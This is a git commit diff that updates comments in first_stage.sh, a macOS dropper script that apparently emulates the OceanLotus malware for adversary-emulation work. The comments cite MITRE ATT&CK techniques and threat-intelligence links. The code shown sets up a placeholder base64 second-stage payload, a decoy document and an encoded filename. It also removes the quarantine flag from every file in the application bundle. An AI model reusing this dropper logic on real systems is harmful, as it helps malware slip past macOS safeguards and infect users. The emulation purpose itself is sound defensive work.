0d7f626bd002c72dd7b3e15031f73819e7c81310
Melanie Chan <61020544+mchan143@users.noreply.github.com>
2023-06-14 19:21:34 -0400

    Update comments in first_stage.sh

--- ocean_lotus/Resources/OSX.OceanLotus/first_stage.sh
+++ ocean_lotus/Resources/OSX.OceanLotus/first_stage.sh
@@ -1,18 +1,38 @@
+# ---------------------------------------------------------------------------
+# first_stage.sh - Executed as part of the OceanLotus application bundle initial access vector
+
+# Usage: ./first_stage.sh
+
+# MITRE ATT&CK Techniques:
+#   T1036.008 Masquerading: Masquerade File Type
+#   T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
+
+# Resources:
+#   https://otx.alienvault.com/indicator/file/be43be21355fb5cc086da7cee667d6e7
+#   https://www.virustotal.com/gui/file/48e3609f543ea4a8de0c9375fa665ceb6d2dfc0085ee90fa22ffaced0c770c4f/detection
+#   https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
+
+# Revision History:
+
+# --------------------------------------------------------------------------- 
+
 #!/bin/bash
 current_directory="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
 current_file="$( basename "${BASH_SOURCE[0]}" )"
 
-# replace with base64 encoded second stage payload
+# base64 encoded second stage payload
 b64_stuff=""
 
 # points to decoy doc in application bundle
 TEMPPATH_IOP="Contents/Resources/default.config"
 # name of decoy document to drop
 doc_name="Decoy.doc"
-# filename of second stage
+# filename of second stage (currently just b64(oceanlotus23))
 temp_var="b2NlYW5sb3R1czIz"
 
 # remove quarantine flag on application bundle
+#   MITRE ATT&CK Techniques:
+#     T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
 find . -exec xattr -d com.apple.quarantine {} + & >/dev/null 2>&1
 
 # get path to the application bundle
